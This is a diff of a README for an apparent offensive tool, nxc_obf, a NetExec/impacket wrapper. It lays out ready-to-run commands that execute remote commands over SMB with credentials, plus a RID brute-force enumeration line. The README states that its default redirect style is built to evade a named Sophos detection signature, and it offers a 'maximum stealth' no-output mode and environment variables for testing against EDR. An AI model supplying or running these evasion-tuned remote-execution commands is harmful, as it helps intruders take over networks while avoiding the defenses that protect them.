@@ -154,14 +154,28 @@ IMPACKET_OPSEC_PACE_MS_MAX=0 nxc_obf smb 10.0.0.5 -u u -p p --rid-brute 5000
 
 ### Exec modes (nxc_obf)
 
-| Mode | Command | Behaviour |
-|---|---|---|
-| **Default** | `nxc_obf smb … -x whoami` | Output collected. Uses the redirect technique from [goexec](https://github.com/FalconForceTeam/goexec) (FalconForce): `>` instead of impacket's `1>`. Both are semantically identical, but the different token evades the Sophos `WIN-EXE-PRC-IMPACKET-WMIEXEC` signature. |
-| **Raw / no-cmd** | `EXEC_NO_CMD=1 nxc_obf …` | No `cmd.exe` child, no redirect, **no output**. Only real `.exe` (no builtins/pipes). |
-| **Stock redirect** | `EXEC_REDIRECT_STYLE=stock nxc_obf …` | Back to impacket's `1>` redirect |
+**Default — goexec-style redirect (output on)**
+```bash
+nxc_obf smb 10.0.0.5 -u user -p pass -x whoami
+```
+Output is collected. Uses the redirect technique from
+[goexec](https://github.com/FalconForceTeam/goexec) (FalconForce): `>` instead
+of impacket's `1>`. Both are semantically identical (redirect stdout), but the
+different token evades the Sophos `WIN-EXE-PRC-IMPACKET-WMIEXEC` signature
+which matches on `1>`.
 
-> **Note:** env vars above are shortened — full prefix is `IMPACKET_OPSEC_`
-> (e.g. `IMPACKET_OPSEC_EXEC_NO_CMD=1`).
+**Raw / no-cmd — maximum stealth (no output)**
+```bash
+IMPACKET_OPSEC_EXEC_NO_CMD=1 nxc_obf smb 10.0.0.5 -u user -p pass -x calc.exe
+```
+No `cmd.exe` child, no redirect, **no output returned**. Only real `.exe` — no
+shell builtins, pipes, or chaining.
+
+**Stock redirect — back to impacket's default**
+```bash
+IMPACKET_OPSEC_EXEC_REDIRECT_STYLE=stock nxc_obf smb 10.0.0.5 -u user -p pass -x whoami
+```
+Reverts to impacket's `1>` redirect (useful for A/B testing against EDR).
 
 ### nxc_obf Quick Reference
 
